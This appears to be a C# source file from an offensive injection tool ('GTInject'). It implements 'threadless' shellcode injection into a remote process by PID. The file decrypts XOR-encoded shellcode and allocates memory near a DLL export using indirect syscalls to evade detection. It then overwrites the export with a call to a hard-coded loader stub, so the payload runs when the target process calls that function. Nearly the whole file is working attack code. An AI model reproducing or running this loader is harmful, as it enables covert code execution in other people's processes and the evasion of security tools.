using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using static GTInject.SysCalls.WinNative;
using GTInject.SysCalls;
using System.Threading;

namespace GTInject.Novel
{
    internal class ThreadlessInject
    {
        public static void Inject(int remoteProcessID, string dll, string export, string bytePath, string xorkey)
        {
            var hModule = GetModuleHandle(dll);

            if (hModule == IntPtr.Zero)
                hModule = LoadLibrary(dll);

            if (hModule == IntPtr.Zero)
            {
                Console.WriteLine($"[!] Failed to open handle to DLL {dll}, is the KnownDll loaded?");
                return;
            }


            var exportAddress = GetProcAddress(hModule, export);
            if (exportAddress == IntPtr.Zero)
            {
                Console.WriteLine($"[!] Failed to find export {export} in {dll}, are you sure it's correct?");
                return;
            }

            Console.WriteLine($"[=] Found {dll}!{export} @ 0x{exportAddress.ToInt64():x}");



            Process rProc = Process.GetProcessById(remoteProcessID);
            int pid = rProc.Id;
            var hProcess = IntPtr.Zero;

            var status = OpenProcess(pid, out hProcess);
            if (status != 0 || hProcess == IntPtr.Zero)
            {
                Console.WriteLine($"[!] Failed to open PID {pid}: {status}.");
                return;
            }

            Console.WriteLine($"[=] Opened process with id {pid}");

            var shellcode = GetShellcode.GetShellcode.readAndDecryptBytes(bytePath, xorkey);

            // backup the previous output handler connected to Console
            TextWriter backupOut = Console.Out;

            // activate a null handle
            Console.SetOut(TextWriter.Null);

            var loaderAddress = FindMemoryHole(
            hProcess,
            (ulong)exportAddress,
            ShellcodeLoader.Length + shellcode.Length);

            // restore the previous handle
            Console.SetOut(backupOut);

            if (loaderAddress == 0)
            {
                Console.WriteLine("[!] Failed to find a memory hole with 2G of export address, bailing");
                return;
            }

            Console.WriteLine($"[=] Allocated loader and shellcode at 0x{loaderAddress:x} within PID {pid}");

            var originalBytes = Marshal.ReadInt64(exportAddress);
            GenerateHook(originalBytes);

            ProtectVirtualMemory(
                hProcess,
                exportAddress,
                8,
                MemoryProtection.ExecuteReadWrite,
                out var oldProtect);

            var relativeLoaderAddress = (int)(loaderAddress - ((ulong)exportAddress + 5));
            var callOpCode = new byte[] { 0xe8, 0, 0, 0, 0 };

            var ms = new MemoryStream(callOpCode);
            var br = new BinaryWriter(ms);
            br.Seek(1, SeekOrigin.Begin);
            br.Write(relativeLoaderAddress);

            status = WriteVirtualMemory(
                hProcess,
                exportAddress,
                callOpCode,
                out var bytesWritten);

            if (status != NTSTATUS.Success || (int)bytesWritten != callOpCode.Length)
            {
                Console.WriteLine($"[!] Failed to write callOpCode: {status}");
                return;
            }



            var payload = ShellcodeLoader.Concat(shellcode).ToArray();
            //WriteProcessMemory(hProcess, (IntPtr)loaderAddress, payload, payload.Length, out _);

            status = ProtectVirtualMemory(
                hProcess,
                (IntPtr)loaderAddress,
                (uint)payload.Length,
                MemoryProtection.ReadWrite,
                out oldProtect);

            if (status != NTSTATUS.Success)
            {
                Console.WriteLine($"[!] Failed to unprotect 0x{loaderAddress:x}");
                return;
            }

            status = WriteVirtualMemory(
                hProcess,
                (IntPtr)loaderAddress,
                payload,
                out bytesWritten);

            if (status != NTSTATUS.Success || (int)bytesWritten != payload.Length)
            {
                Console.WriteLine($"[!] Failed to write payload: {status}");
                return;
            }

            status = ProtectVirtualMemory(
                hProcess,
                (IntPtr)loaderAddress,
                (uint)payload.Length,
                oldProtect,
                out _);

            if (status != NTSTATUS.Success)
            {
                Console.WriteLine($"[!] Failed to protect 0x{loaderAddress:x}");
                return;
            }

            var timer = new Stopwatch();
            timer.Start();
            var executed = false;

            Console.WriteLine("[+] Shellcode injected, Waiting 60s for the hook to be called");

            while (timer.Elapsed.TotalSeconds < 60)
            {
                var bytesToRead = 8;
                var buf = Marshal.AllocHGlobal(bytesToRead);

                ReadVirtualMemory(
                    hProcess,
                    exportAddress,
                    buf,
                    (uint)bytesToRead,
                    out var bytesRead);

                var temp = new byte[bytesRead];
                Marshal.Copy(buf, temp, 0, bytesToRead);
                var currentBytes = BitConverter.ToInt64(temp, 0);

                if (originalBytes == currentBytes)
                {
                    executed = true;
                    break;
                }

                Thread.Sleep(1000);
            }

            timer.Stop();

            if (executed)
            {
                ProtectVirtualMemory(
                    hProcess,
                    exportAddress,
                    8,
                    oldProtect,
                    out _);

                FreeVirtualMemory(
                    hProcess,
                    (IntPtr)loaderAddress);

                Console.WriteLine($"[+] Shellcode executed after {timer.Elapsed.TotalSeconds}s, export restored");
            }
            else
            {
                Console.WriteLine("[!] Shellcode did not trigger within 60s, it may still execute but we are not cleaning up");
            }

            CloseHandle(hProcess);
        }



        //////////
        // Supporting functions from Threadless Inject
        //////////


        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObj);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

        [Flags]
        public enum ProcessAccess : uint
        {
            None = 0,
            Terminate = 0x0001,
            CreateThread = 0x0002,
            SetSessionId = 0x0004,
            VmOperation = 0x0008,
            VmRead = 0x0010,
            VmWrite = 0x0020,
            DupHandle = 0x0040,
            CreateProcess = 0x0080,
            SetQuota = 0x0100,
            SetInformation = 0x0200,
            QueryInformation = 0x0400,
            SuspendResume = 0x0800,
            QueryLimitedInformation = 0x1000,
            SetLimitedInformation = 0x2000,
            AllAccess = 0x1FFFFF
        }

        [Flags]
        public enum MemoryAllocation : uint
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Reset = 0x80000,
            ResetUndo = 0x1000000,
            LargePages = 0x20000000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            CoalescePlaceholders = 0x1,
            PreservePlaceholder = 0x2,
            Decommit = 0x4000,
            Release = 0x8000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            PageNoAccess = 0x01,
            Readonly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            Guard = 0x100,
            NoCache = 0x200,
            WriteCombine = 0x400,
            TargetsInvalid = 0x40000000,
            TargetsNoUpdate = 0x40000000
        }
        public static IntPtr LoadLibrary(string path)
        {
            var us = new UNICODE_STRING();
            RtlInitUnicodeString(ref us, path);

            var hModule = IntPtr.Zero;

            var status = LdrLoadDll(
                IntPtr.Zero,
                0,
                ref us,
                ref hModule);

            return hModule;
        }

        public static NTSTATUS OpenProcess(int pid, out IntPtr hProcess)
        {
            hProcess = IntPtr.Zero;
            var oa = new ObjectAttributes();
            var cid = new ClientId { UniqueProcess = (IntPtr)pid };

            return NtOpenProcess(
                ref hProcess,
                ProcessAccess.VmOperation | ProcessAccess.VmRead | ProcessAccess.VmWrite,
                ref oa,
                ref cid);
        }

        public static NTSTATUS AllocateVirtualMemory(IntPtr hProcess, ulong address, int size)
        {
            var baseAddress = (IntPtr)address;
            var regionSize = (IntPtr)size;
            return NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                MemoryAllocation.Commit | MemoryAllocation.Reserve,
                MemoryProtection.ExecuteRead);
        }

        public static NTSTATUS ProtectVirtualMemory(IntPtr hProcess, IntPtr address, uint size, MemoryProtection newProtection,
            out MemoryProtection oldProtection)
        {
            var regionSize = new UIntPtr(size);

            return NtProtectVirtualMemory(
                hProcess,
                ref address,
                ref regionSize,
                newProtection,
                out oldProtection);
        }

        public static NTSTATUS WriteVirtualMemory(IntPtr hProcess, IntPtr address, byte[] buffer, out uint bytesWritten)
        {
            var buf = Marshal.AllocHGlobal(buffer.Length);
            Marshal.Copy(buffer, 0, buf, buffer.Length);

            bytesWritten = 0;

            var status = NtWriteVirtualMemory(
                hProcess,
                address,
                buf,
                (uint)buffer.Length,
                ref bytesWritten);

            Marshal.FreeHGlobal(buf);

            return status;
        }

        public static NTSTATUS ReadVirtualMemory(IntPtr hProcess, IntPtr address, IntPtr buffer, uint bytesToRead,
            out uint bytesRead)
        {
            uint read = 0;
            var status = NtReadVirtualMemory(
                hProcess,
                address,
                buffer,
                bytesToRead,
                ref read);

            bytesRead = read;
            return status;
        }

        public static NTSTATUS FreeVirtualMemory(IntPtr hProcess, IntPtr address)
        {
            var regionSize = (UIntPtr)0;
            return NtFreeVirtualMemory(
                hProcess,
                ref address,
                ref regionSize,
                MemoryAllocation.Release);
        }

        [DllImport("ntdll.dll")]
        private static extern void RtlInitUnicodeString(
            ref UNICODE_STRING destinationString,
            [MarshalAs(UnmanagedType.LPWStr)] string sourceString);

        [DllImport("ntdll.dll")]
        private static extern NTSTATUS LdrLoadDll(
            IntPtr filePath,
            uint dwFlags,
            ref UNICODE_STRING moduleFileName,
            ref IntPtr moduleHandle);

        [DllImport("ntdll.dll")]
        private static extern NTSTATUS NtOpenProcess(
            ref IntPtr processHandle,
            ProcessAccess desiredAccess,
            ref ObjectAttributes objectAttributes,
            ref ClientId clientId);

        [DllImport("ntdll.dll")]
        private static extern NTSTATUS NtAllocateVirtualMemory(
            IntPtr processHandle,
            ref IntPtr baseAddress,
            IntPtr zeroBits,
            ref IntPtr regionSize,
            MemoryAllocation allocationType,
            MemoryProtection memoryProtection);

        [DllImport("ntdll.dll")]
        private static extern NTSTATUS NtProtectVirtualMemory(
            IntPtr processHandle,
            ref IntPtr baseAddress,
            ref UIntPtr regionSize,
            MemoryProtection newProtect,
            out MemoryProtection oldProtect);

        [DllImport("ntdll.dll")]
        private static extern NTSTATUS NtReadVirtualMemory(
            IntPtr processHandle,
            IntPtr baseAddress,
            IntPtr buffer,
            uint bytesToRead,
            ref uint bytesRead);

        [DllImport("ntdll.dll")]
        private static extern NTSTATUS NtWriteVirtualMemory(
            IntPtr processHandle,
            IntPtr baseAddress,
            IntPtr buffer,
            uint bufferLength,
            ref uint bytesWritten);

        [DllImport("ntdll.dll")]
        private static extern NTSTATUS NtFreeVirtualMemory(
            IntPtr processHandle,
            ref IntPtr baseAddress,
            ref UIntPtr regionSize,
            MemoryAllocation freeType);

        [StructLayout(LayoutKind.Sequential)]
        private struct ObjectAttributes
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct ClientId
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct UNICODE_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }

        public enum NTSTATUS : uint
        {
            // Success
            Success = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,

            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,

            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,

            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            ConflictingAddresses = 0xc0000018,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InsufficientResources = 0xc000009a,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            ProcessIsTerminating = 0xc000010a,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            InvalidAddress = 0xc0000141,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,

            MaximumNtStatus = 0xffffffff
        }
        private static readonly byte[] ShellcodeLoader =
        {
            0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
            0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
            0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
            0xE0, 0x90
        };

        private static IntPtr GetModuleHandle(string dll)
        {
            var self = Process.GetCurrentProcess();

            foreach (ProcessModule module in self.Modules)
            {
                if (!module.ModuleName.Equals(dll, StringComparison.OrdinalIgnoreCase))
                    continue;

                return module.BaseAddress;
            }

            return IntPtr.Zero;
        }

        private static void GenerateHook(long originalInstructions)
        {
            var writer = new BinaryWriter(new MemoryStream(ShellcodeLoader));
            writer.Seek(0x12, SeekOrigin.Begin);
            writer.Write(originalInstructions);
            writer.Flush();
        }

        private static ulong FindMemoryHole(IntPtr hProcess, ulong exportAddress, int size)
        {
            ulong remoteLoaderAddress;
            var foundMemory = false;

            for (remoteLoaderAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000;
                 remoteLoaderAddress < exportAddress + 0x70000000;
                 remoteLoaderAddress += 0x10000)
            {
                var baseAddr = (IntPtr)remoteLoaderAddress;
                var regionSize = (IntPtr)size;
                var status = Syscalls.IndirectSysclNtAllocateVirtualMemory(hProcess, ref baseAddr, IntPtr.Zero, ref regionSize, (uint)(AllocationType.Commit|AllocationType.Reserve), (uint)(MemoryProtection.ExecuteRead));
                if (status != WinNative.NTSTATUS.Success)
                    continue;

                foundMemory = true;
                break;
            }

            return foundMemory ? remoteLoaderAddress : 0;

        }




    }
}
